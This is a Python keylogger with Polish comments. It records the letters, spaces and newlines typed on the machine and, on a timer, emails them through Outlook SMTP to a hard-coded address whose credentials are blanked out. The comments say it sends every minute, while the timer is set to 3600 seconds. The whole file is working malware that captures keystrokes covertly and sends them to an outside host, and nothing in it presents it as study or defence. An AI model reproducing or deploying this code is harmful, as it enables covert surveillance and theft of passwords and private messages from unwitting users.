from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading

# Zmienna przechowująca wpisane słowa
wpisane_slowa = []

# Zmienna kontrolująca, czy program powinien działać
running = True

def send_email(words):
    # Login information for the email account
    email = "@outlook.com"
    password = "!!!"
    to_email = "@outlook.com"

    # Create the email message
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = to_email
    msg['Subject'] = "Logged Words"

    # Attach the logged words to the email body
    body = ' '.join(words)
    msg.attach(MIMEText(body, 'plain'))

    # Send the email
    try:
        print("Starting SMTP connection...")
        server = smtplib.SMTP('smtp-mail.outlook.com', 587)

        print("Setting debug level...")
        server.set_debuglevel(1)
        print("Starting TLS...")
        server.starttls()
        print("Logging in...")
        server.login(email, password)
        print("Preparing email...")
        text = msg.as_string()
        print("Sending email...")
        server.sendmail(email, to_email, text)
        print("Quitting...")
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email. Error: {str(e)}")

def on_press(key):
    global wpisane_slowa
    try:
        if key.char.isalpha():
            wpisane_slowa.append(key.char)
        elif key.char.isspace():
            wpisane_slowa.append(' ')
        elif key == keyboard.KeyCode.from_char('\n'):
            wpisane_slowa.append('\n')
    except AttributeError:
        if key == keyboard.Key.space:
            wpisane_slowa.append(' ')
        elif key == keyboard.Key.enter:
            wpisane_slowa.append('\n')
        pass

#def on_release(key):
#    global running
#    # Jeśli zwolniony klawisz to klawisz Esc, zakończ nasłuchiwanie
#    if key == keyboard.Key.esc:
#        with open("wpisane_slowa.txt", "w") as file:
#            file.write(''.join(wpisane_slowa))
#        running = False  # Zatrzymaj program
#        return False

def send_emails_periodically():
    global wpisane_slowa, running

    # Najpierw wysyłamy e-mail
    send_email(wpisane_slowa)

    # Teraz czyscimy listę wpisanych słów
    wpisane_slowa = []

    # Następnie, jeśli program nadal działa, ustawiamy timer na 60 sekund, po którym ponownie wywołamy tę funkcję
    if running:
        threading.Timer(3600, send_emails_periodically).start()

# Zaczynamy wysyłać e-maile co minutę
send_emails_periodically()

# Start nasłuchiwania
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
